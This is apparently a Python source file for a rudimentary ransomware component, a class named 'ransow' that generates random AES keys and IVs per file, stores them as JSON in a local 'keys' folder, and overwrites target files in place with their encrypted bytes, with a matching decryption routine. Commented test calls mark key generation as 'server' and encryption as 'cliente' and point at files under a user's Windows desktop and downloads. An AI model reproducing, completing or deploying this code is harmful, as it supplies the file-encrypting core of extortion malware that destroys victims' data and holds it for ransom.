import os
from fitxategiak.aesencrypt import aesenc
import binascii
import json
import shutil


class ransow(object):
    def __init__(self):
      None

    def Generefolder(self):
        os.chdir(".")
        if os.path.exists("keys"):
           os.chdir("keys")
        else:
           os.mkdir("keys", mode=0o777, dir_fd=None)
           os.chdir("keys")
       

    def GenerateKey(self,ruta,tamaño):   
            name = None 
            if tamaño == "one":
                r = ruta.split("/")
                nameAr = r[len(r)-1]
                name = nameAr.split(".") 
            elif tamaño == "all":
                None
            key = binascii.hexlify(os.urandom(32))
            iv = binascii.hexlify(os.urandom(16)) 
            Aes = {}
            Aes["key"] = str(key,encoding='utf-8')
            Aes["iv"] = str(iv,encoding='utf-8')
            strDecriAes = json.dumps(Aes)
            with open(f'{name[0]}.json', "w", encoding="utf-8") as fichero:
                json.dump(Aes, fichero, indent=4, ensure_ascii=False)
            os.chdir("../")
            return strDecriAes
        
         
    def encriptFile(self,jsonk,ruta):
         try:
            print(ruta)
            jsonkeys = json.loads(jsonk)
            with open(ruta, "rb") as archivo: 
                contenido = archivo.read() 
            aes = aesenc(binascii.unhexlify(bytes(jsonkeys["key"],encoding='utf-8')),binascii.unhexlify(bytes(jsonkeys["iv"],encoding='utf-8')))
            c = aes.encript(contenido)
            with open(f'{ruta}',"wb") as enarchivo:
                enarchivo.write(c)   
            return f'{ruta} : encritation'
         except:
             return "file none"
    
    def loadKeys(self,keysFile):
        os.chdir("keys")
        print(f'file name root : {os.getcwd()}')
        try:
            with open(keysFile,'r') as arch:
                jsonKey = json.load(arch)
            Stjsonkey = json.dumps(jsonKey)
            print(jsonKey)
            return Stjsonkey
        except:
            print("no file")
            None
        os.chdir("../")

    def decripFile(self,jsonk,ruta):
         try:
            print(ruta)
            jsonkeys = json.loads(jsonk)
            print(jsonkeys)
            with open(ruta, "rb") as archivo: 
                contenido = archivo.read() 
            aes = aesenc(binascii.unhexlify(bytes(jsonkeys["key"],encoding='utf-8')),binascii.unhexlify(bytes(jsonkeys["iv"],encoding='utf-8')))
            c = aes.decript(contenido)
            with open(ruta,"wb") as enarchivo:
                enarchivo.write(c)   
         except:
             print("none file")
"""""
ran = ransow()
ran.Generefolder() #server
keys = ran.GenerateKey("C:/Users/garra/Desktop/upx-4.2.4-win64/upx-4.2.4-win64/THANKS.txt","one") # server
ran.encriptFile(keys,"C:/Users/garra/Desktop/upx-4.2.4-win64/upx-4.2.4-win64/THANKS.txt") #cliente
"""
"""""
ran = ransow()
keys = ran.loadKeys('THANKS.json')
ran.decripFile(keys,"C:/Users/garra/Desktop/upx-4.2.4-win64/upx-4.2.4-win64/THANKS.txt")
"""
"""
    ruta_completa = os.path.abspath(__file__)
     f =  C:\\Users\\garra\\Downloads\\the_witcher_3_wild_hunt_game_of_the_year_edition_game_73662\\setup_the_witcher_3_wild_hunt_-_game_of_the_year_edition_4.04a_redkit_update_2_(73662)-4.bin
"""